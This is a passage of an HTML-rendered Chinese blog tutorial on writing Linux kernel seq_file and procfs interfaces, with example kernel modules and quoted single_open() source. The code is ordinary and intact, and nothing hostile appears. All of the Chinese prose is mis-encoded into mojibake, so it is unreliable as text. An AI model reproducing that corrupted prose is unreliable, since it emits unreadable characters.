class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="stop-ï¼šåºåˆ—æ–‡ä»¶å…³é—­æ¸…ç†"><a href="#stop-ï¼šåºåˆ—æ–‡ä»¶å…³é—­æ¸…ç†" class="headerlink" title="stop()ï¼šåºåˆ—æ–‡ä»¶å…³é—­æ¸…ç†"></a>stop()ï¼šåºåˆ—æ–‡ä»¶å…³é—­æ¸…ç†</h3><p><code>stop()</code> å‡½æ•°ç”¨äºåœ¨å•ä¸ª session ç»“æŸæ—¶è¿›è¡Œä¸€äº›è‡ªå®šä¹‰çš„éœ€è¦çš„æ¸…ç†å·¥ä½œï¼Œå› æ­¤é€šå¸¸ä¹Ÿå¯ä»¥åªæ˜¯ä¸€ä¸ªç©ºå‡½æ•°ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šåˆå§‹åŒ–"><a href="#åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šåˆå§‹åŒ–" class="headerlink" title="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šåˆå§‹åŒ–"></a>åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šåˆå§‹åŒ–</h2><p>å®Œæˆäº†åºåˆ—æ–‡ä»¶æ¥å£å››ä¸ªå‡½æ•°çš„å®šä¹‰åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨åˆ›å»ºé€šç”¨ VFS èŠ‚ç‚¹æ—¶è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸»è¦å°±æ˜¯å®šä¹‰å››ä¸ªé€šç”¨å‡½æ•°ï¼š</p><ul><li><code>open()</code> ï¼šè¯¥å‡½æ•°ä¸­æˆ‘ä»¬éœ€è¦è°ƒç”¨ <code>seq_open()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œå…¶ä¼šåˆ†é…ä¸€ä¸ª <code>seq_file</code> ç»“æ„ä½“å­˜æ”¾åˆ° <code>file-&gt;private</code> ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>__seq_open_private()</code> ï¼ˆç­‰ä»·äºå¤šä¸€æ¬¡ kmalloc() åˆ†é…è‡ªå®šä¹‰æ•°æ®å¯¹è±¡ï¼‰</li><li>äºŒé€‰ä¸€ï¼š<ul><li><code>read()</code> ï¼šè¯¥å‡½æ•°æŒ‡é’ˆéœ€è¦è¢«åˆå§‹åŒ–ä¸º <code>seq_read()</code> ï¼Œä½†ä½ ä¹Ÿå¯ä»¥å†å¥—ä¸ª wrapper</li><li><code>read_iter()</code> ï¼šè¯¥å‡½æ•°æŒ‡é’ˆéœ€è¦è¢«åˆå§‹åŒ–ä¸º <code>seq_read_iter()</code> ï¼Œä½†ä½ ä¹Ÿå¯ä»¥å†å¥—ä¸ª wrapper</li></ul></li><li><code>lseek()</code> ï¼šè¯¥å‡½æ•°æŒ‡é’ˆéœ€è¦è¢«åˆå§‹åŒ–ä¸º <code>seq_lseek()</code> ï¼Œä½†ä½ ä¹Ÿå¯ä»¥å†å¥—ä¸ª wrapper</li><li><code>release()</code> ï¼šè¯¥å‡½æ•°æŒ‡é’ˆéœ€è¦è¢«åˆå§‹åŒ–ä¸º <code>seq_release()</code> ï¼Œä½†ä½ ä¹Ÿå¯ä»¥å†å¥—ä¸ª wrapper</li></ul><p>ä¹‹ååƒå¾€å¸¸ä¸€æ ·åˆå§‹åŒ–æ–‡ä»¶æ¥å£å³å¯ï¼Œå¯¹åºåˆ—æ–‡ä»¶æ¥å£çš„æ“ä½œéƒ½ä¼šç›´æ¥é€šè¿‡è¿™äº› <code>seq_*</code> API å®Œæˆï¼Œè¿™æå¤§åœ°ç®€åŒ–äº†å¼€å‘è€…çš„å·¥ä½œï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬ä»¥ <code>procfs</code> ä¸ºä¾‹çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> seq_open(f, &amp;a3kmod_seq_ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    <span class="hljs-comment">//.proc_read_iter = seq_read_iter, /* it&#x27;s also okay! */</span><br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å†…æ ¸éå¸¸å®Œç¾åœ°æŒ‰ç…§æˆ‘ä»¬çš„éœ€æ±‚è¾“å‡ºäº†åºåˆ—æ–‡ä»¶æ•°æ®ï¼š</p><p><img src="https://s2.loli.net/2024/06/02/xL3wgmPoT9IUCN7.png"></p><h2 id="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šsingle-fileï¼ˆä»…å•ä¸ªåºåˆ—å¯¹è±¡è¯»å–çš„ç®€æ˜“é¢„å®ç°ï¼‰"><a href="#åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šsingle-fileï¼ˆä»…å•ä¸ªåºåˆ—å¯¹è±¡è¯»å–çš„ç®€æ˜“é¢„å®ç°ï¼‰" class="headerlink" title="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šsingle fileï¼ˆä»…å•ä¸ªåºåˆ—å¯¹è±¡è¯»å–çš„ç®€æ˜“é¢„å®ç°ï¼‰"></a>åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šsingle fileï¼ˆä»…å•ä¸ªåºåˆ—å¯¹è±¡è¯»å–çš„ç®€æ˜“é¢„å®ç°ï¼‰</h2><p> <code>/fs/seq_file.c</code> ä¸­é™¤äº†åºåˆ—æ–‡ä»¶æ¥å£ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å¥—å·²ç»å†™å¥½çš„ <code>single_*</code> å¼€å¤´çš„åºåˆ—æ–‡ä»¶æ¥å£å®ç°ï¼Œå¼€å‘è€…åªéœ€è¦è¡¥å……å®ç° <code>show()</code> å‡½æ•°å³å¯ï¼Œè¿™é€šå¸¸ç”¨äºä¸€äº›å¹¶ä¸éœ€è¦å¤ªå¤æ‚å®ç°çš„ <strong>åªéœ€è¦è¯»å–ä¸€æ¬¡çš„</strong> åœºæ™¯ï¼ˆä¾‹å¦‚è¯»å– <code>/proc/self/stat</code> ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">single_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-keyword">return</span> *pos ? <span class="hljs-literal">NULL</span> : SEQ_START_TOKEN;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">single_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>++*pos;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">single_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">single_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">int</span> (*show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *),</span><br><span class="hljs-params"><span class="hljs-type">void</span> *data)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);<br><span class="hljs-type">int</span> res = -ENOMEM;<br><br><span class="hljs-keyword">if</span> (op) &#123;<br>op-&gt;start = single_start;<br>op-&gt;next = single_next;<br>op-&gt;stop = single_stop;<br>op-&gt;show = show;<br>res = seq_open(file, op);<br><span class="hljs-keyword">if</span> (!res)<br>((<span class="hljs-keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;<br><span class="hljs-keyword">else</span><br>kfree(op);<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br>EXPORT_SYMBOL(single_open);<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ single file å®ç°æˆ‘ä»¬åªéœ€è¦å°†å‰é¢çš„ <code>seq_open()</code> æ›¿æ¢ä¸º <code>single_open()</code> å¹¶å®šä¹‰ä¸€ä¸ª <code>show()</code> å³å¯ï¼Œæ³¨æ„ä¼ ç»™ <code>show()</code> çš„åºåˆ—å¯¹è±¡æ°¸è¿œéƒ½æ˜¯ NULL ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_data</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> age;<br>    <span class="hljs-type">size_t</span> money;<br>&#125; a3_info = &#123;<br>    .name   = <span class="hljs-string">&quot;arttnba3&quot;</span>,<br>    .age    = <span class="hljs-number">23</span>,<br>    .money  = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] name: %s\n&quot;</span>, a3_info.name);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] age: %ld\n&quot;</span>, a3_info.age);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] money: %ld\n&quot;</span>, a3_info.money);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> single_open(f, a3kmod_seq_show, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2024/06/03/BMN2iSZJVb3kwht.png"></p><h2 id="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šproc-seq-æ¥å£"><a href="#åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šproc-seq-æ¥å£" class="headerlink" title="åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šproc_seq æ¥å£"></a>åºåˆ—æ–‡ä»¶æ¥å£å¼€å‘ï¼šproc_seq æ¥å£</h2><p>proc_seq æ¥å£åŒæ—¶æä¾›äº†åˆ›å»º procfs èŠ‚ç‚¹ä¸åˆå§‹åŒ– seq_file çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨ <code>proc_create_seq()</code> ä¾¿èƒ½åˆ›å»º procfs + åˆå§‹åŒ– seq_file ä¸€æ­¥åˆ°ä½ï¼Œåº•å±‚è€Œè¨€ä¸åŒçš„æ˜¯å…¶å¸®æˆ‘ä»¬å®ç°çš„æ˜¯ <code>read_iter</code> æ¥å£è€Œé <code>read()</code> æ¥å£ï¼Œè¿™æ„å‘³ç€ <em>è¿™æ ·çš„åºåˆ—æ–‡ä»¶å¯ä»¥ä»å†…æ ¸ä¾§è¢«è¯»å–</em></p><p>ä¸‹é¢æ˜¯å¯¹ä¸Šé¢çš„é“¾è¡¨è¯»å–çš„ä¾‹å­è¿›è¡Œç®€å•é‡å†™çš„ä¾‹å­ï¼š</p><blockquote><p>å…¶å®ä¹Ÿæ²¡æœ‰ç®€åŒ–å¤ªå¤šâ€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span 